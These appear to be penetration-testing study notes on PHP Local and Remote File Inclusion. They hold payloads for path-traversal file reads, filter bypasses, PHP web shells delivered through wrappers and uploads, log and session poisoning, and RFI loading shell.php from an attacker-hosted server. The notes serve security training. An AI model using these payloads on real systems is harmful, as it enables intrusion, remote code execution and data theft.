Sometimes, `HTTP parameters` like `/index.php?page=about` might be used to specify `which resource` is shown on the page. If not securely coded, an attacker could manipulate these parameters to `display the content of any local file`on the server. 



# Local File Inclusion (LFI)
## Automated Scanning
- `Fuzz for discovering parameters & fuzz them to discover LFI`
```bash
# Fuzzing GET / POST parameter
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

# Testing LFI
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
Here are a list of `wordlists` we can use w/ `Burp Intruder`, to fuzz whenever we see a `parameter including a page`
[LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
[LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
### Web Root Path
- We may need to know the full `server webroot path` to complete our LFI (like if we uploaded a file and can't reach it !). We'll need to `fuzz for the index.php` first
[Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
[Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
[LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
```bash
# Fuzzing to find default server webroot path. We might need filters depending on LFI situation
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
### Logs Directory
- We also want to know the `server logs directory`, to deploy potential attack w/ those wordlists
[Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
[Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
```bash
# Fuzzing to find logs directory. We might need filters depending on LFI situation
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
### LFI Tools
The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). Most of these tools are `not maintained` and rely on `python2` !!
## Reading File
```bash
# Default basic inclusion
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd

# Basic bypasses
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=..././..././..././etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=....////....////....////etc/passwd

# Encoding payloads. We may double encode the strings to bypass other filters
http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Approved path w/ the path (or folder) used by default w/ the web app. Here it is "languages"
http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd

# Appended Extension : Path truncation. Only work w/ PHP versions before 5.3/5.4. Should calculate the length of the string to ensure only .php gets truncated
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
http://<SERVER_IP>:<PORT>/index.php?language=non_existing_directory/../../../etc/passwd/./././././[./ REPEATED ~2048 times]

# Appended Extension : Null Bytes. Only work w/ PHP versions before 5.5. End our payload w/ "%00"
/etc/passwd%00
```
**Note:** We should combine all techniques together as web app may apply several filters. We may refer [[Command Injections]] for more about bypassing blacklisted characters
- We may look in files for interesting `database password` or `SSH keys` 
### Second-order Attacks
- If a web app allows us to download our avatar through a URL like (`/profile/$username/avatar.png`), we may craft a malicious LFI username (`../../../etc/passwd`) to change the file being pulled
### Source Code Disclosure
[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, which we can use with the `php://filter/` scheme. Those can help us to read `PHP source code` 
```bash
# Fuzz for PHP files. We should be scanning for all HTTP response code including 301,302 & 403
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

# Read the config page : here the web app is appending the .php extension to the page
php://filter/read=convert.base64-encode/resource=config
echo 'BASE64_STRING' | base64 -d
```
## LFI to RCE
We may use `file inclusion` to `execute code` on the back-end servers and gain control over them.
### PHP Wrappers
#### Data
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. Only available if the `allow_url_include` setting is enabled in the PHP configurations file (not enabled by default, but no uncommon as many web apps need it like WordPress plugins / themes).
- We can `check the PHP configuration` through the `LFI` vulnerability. We could use the previous `base64` filter
```bash
# Default PHP configuration file for Apache where X.Y is the PHP version
/etc/php/X.Y/apache2/php.ini

# Default PHP configuration file for Nginx where X.Y is the PHP version
/etc/php/X.Y/fpm/php.ini

# Retrieving PHP configuration file w/ PHP base64 filter
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Decode the retrieved file and search for the allow_url_include parameter we need
echo 'BASE64_STRING' | base64 -d | grep allow_url_include
```
**Note:** We can start with the latest `PHP version`, and try earlier versions if we couldn't locate the configuration file
- If the `allow_url_include` setting is set on `On`, we could use the `data wrapper` to include external data like `malicious PHP code`. 
```bash
# Getting a PHP web shell base64 encoded
echo '<?php system($_GET["cmd"]); ?>' | base64
```
- We'll need to `URL encode` the `base64 string` and use it w/ the data wrapper `data://text/plain;base64,`. We can pass commands to the web shell like `&cmd=<COMMAND>`
```bash
# Execute RCE w/ data wrapper + base64 encoded PHP web shell
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# Same w/ cURL
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
#### Input
Works like the `data`wrapper, the difference is we pass our [input](https://www.php.net/manual/en/wrappers.php.php) as `POST` request's data. `The vulnerable parameter must accept POST requests for this attack to work`. 
- The `allow_url_include` setting in the PHP configurations file hathe [expect](https://www.php.net/manual/en/wrappers.expect.php) wrappers to be `enabled`. We can use the same previous technique to grab its value : we can `check the PHP configuration` through the `LFI` vulnerability. We could use the previous `base64` filter
```bash
# Default PHP configuration file for Apache where X.Y is the PHP version
/etc/php/X.Y/apache2/php.ini

# Default PHP configuration file for Nginx where X.Y is the PHP version
/etc/php/X.Y/fpm/php.ini

# Retrieving PHP configuration file w/ PHP base64 filter
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Decode the retrieved file and search for the allow_url_include parameter we need
echo 'BASE64_STRING' | base64 -d | grep allow_url_include
```
**Note:** We can start with the latest `PHP version`, and try earlier versions if we couldn't locate the configuration file
- Once found enabled, we can use the `input` wrapper to send a `POST request` and add a web shell as `POST` data
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (`<\?php system('id')?>`)
#### Expect
The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams. We `don't need to provide a web shell` as it is `designed to execute commands`.
- We'll also need to search for the `expect`parameter in the `PHP configuration file` like we did before : we can `check the PHP configuration` through the `LFI` vulnerability. We could use the previous `base64` filter but we'll search for `expect` instead
```bash
# Default PHP configuration file for Apache where X.Y is the PHP version
/etc/php/X.Y/apache2/php.ini

# Default PHP configuration file for Nginx where X.Y is the PHP version
/etc/php/X.Y/fpm/php.ini

# Retrieving PHP configuration file w/ PHP base64 filter
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Decode the retrieved file and search for the expect parameter we need
echo 'BASE64_STRING' | base64 -d | grep expect
<SNIP>
extension=expect
```
**Note:** We can start with the latest `PHP version`, and try earlier versions if we couldn't locate the configuration file
- Once found enabled, we can use the `expect://` wrapper w/ `system commands`
```bash
# RCE w/ the expect wrapper
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
**Note:** The [[XML External Entity (XXE)]] module also covers using the `expect` module w/ `XXE`
### Remote File Inclusion (RFI)
We could also include [Remote File](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion) if the function allows the inclusion of `remote URLs`. We could use it for `enumerating local-only ports & web app`, or `upload a malicious` script to gain `RCE`. Almost any `RFI` is an `LFI`.
- Any `remote URL inclusion` in `PHP` would require the `allow_url_include` setting to be enabled. We can check for it as we did previously
- If the vulnerable web application is a `Windows server` (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the `SMB protocol` for the remote file inclusion.
- `We should always start by trying to include a local URL` like `http://127.0.0.1:80/index.php`to see if we're getting blocked by a firewall or a WAF
- We should check that the remote included page gets `rendered` & thus `executed`
- We just have to host our script using `different services` and prioritize port `80` or `443`, as `protocols / ports` might be blocked by `firewall / WAF`
```bash
# Using HTTP
sudo python3 -m http.server
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

# Using FTP
sudo python -m pyftpdlib -p 21
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
# Specifying FTP credentials
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'

# Using SMB. Don't need any non-default settings to be enabled on Windows
impacket-smbserver -smb2support share $(pwd)
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
Note: [[Server-Side Request Forgery (SSRF)]] techniques could also be used w/ `RFIs`
### File Uploads + LFI 
For this, we'll need the vulnerable function to have `Execute` capabilities. We could store a `PHP web shell` within a `image.jpg` instead of "image data", and include it through the LFI vulnerability to get the code executed. The vulnerability `isn't in the upload form` like in [[File Upload]] but in the `file inclusion functionnality`, if we can reach `the path` our malicious uploaded image to get it executed 
```bash
# Craft a malicious image w/ webshell + GIF magic bytes
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- Once uploaded, we need to `grab the path` of our uploaded file and include it through the `LFI` vuln to execute code
```bash
# Include craft image to LFI. We may bypass some filters for accessing uploaded image
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```
**Note:** We can combine all the `previous filters` to fetch the image and `bypass characters restrictions` 
#### ZIP Upload
Another technique is to use the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. But this wrapper `isn't enabled by default`.
```bash
# Create webshell & zip it to an image file
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

# Include the .jpg archive w/ zip wrapper & refer any file within with #shell.php (url encoded)
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
**Note:** Even if we named our `zip archive` as `.jpg`, some upload forms may still detect it as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
Again, the path `./profile_images` is by default but we might combine it w/ other filters and bypasses techniques
#### Phar Upload
We can use the `phar://` wrapper to achieve a similar result. We'll need to write a `shell.php` script containing
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
- This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg`
```bash
# Compiling shell.php script to create a phar file shell.jpg
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
- Once the `shell.jpg` phar file has been uploaded, we can call it w/ the `phar://` wrapper by specifying its URL & specify the phar sub-file `/shell.txt` containing the webshell (URL encoded) to get the output of the command we specify with (`&cmd=id`)
```bash
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
**Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (`LFI + uploads enabled + old PHP + exposed phpinfo()`). We can refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).
**Note2:** Both the `zip` and `phar` wrapper methods should be considered as alternative methods in case the first method did not work, as the first upload method is the most reliable among the three.
### Log Poisoning
This attack rely on the same concept as before : we will exploit a function that has `Execute` privilege. We'll write `PHP code` into a `log file` through a field we control, and use the `LFI` to `include that log file` to execute the `PHP` code. The `PHP web app` need `read privileges` over the logged files. 
#### PHP Session Poisoning
`PHPSESSID` cookies on `PHP` web app hold specific user-related data on the back-end, in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix.
- The first thing we need to do is check if we have a `PHPSESSID` cookie set to our session. We could try to include it w/ the `LFI` to try to read its value if possible
```bash
# Try to read the PHPSESSID cookie in Linux using the sess_PHPSESSID-VALUE
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
 - For the attack to work, we'll need to `control a page's value` that gets `reflected in the log file`. For example, if we try to set a random value like `session_poisoning` to a page `http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning`, we can try to include the session log file like previously `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` to see if our value gets `reflected` in the log. 
![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)
- As we can see in the `line of the log`, our inputed value `session_poisoning` has been reflected in the log file. This time we could try to write a `PHP` web shell by `changing the parameters value` to a `URL encoded web shell`
```bash
# Inputing a URL encoded web shell
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
- Finally, we can include the log file using the `PHPSESSID cookie value` in the vulnerable parameter & executing a command
```bash
# Including the log file & execute the id command
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
**Note:** To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would send a reverse shell for easier interaction.
#### Server Log Poisoning
The `access.log` file maintained by both `Apache` & `Nginx` contains various information about requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above. We need to have `read access` over the logs. 
- `Nginx` logs are readable by low privileged users by default (`www-data`), while the `Apache` logs are only readable by users with high privileges (`root`/`adm` groups)
- By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. We could fuzz the parameter to find the location in non-default
- If we can `read the log file` through the `LFI`, we should check that the `User-Agent` header gets reflected
![image](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)
**Note:** As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.
- We may also poison the log by sending a request w/ `cURL`
```bash
# Poisoning log file w/ simple request using User-Agent header
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```
- As the log file should now contain the `PHP` code, we could execute commands through the `LFI` by using `&cmd=COMMAND` after the log file
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id"
```
**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files.
The same attack may be possible on different system logs if we have `read access` :
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
We should first attempt to read those `logs` w/ `LFI` if for example we have `ssh`or `ftp`services exposed, and logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

**Note:** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.




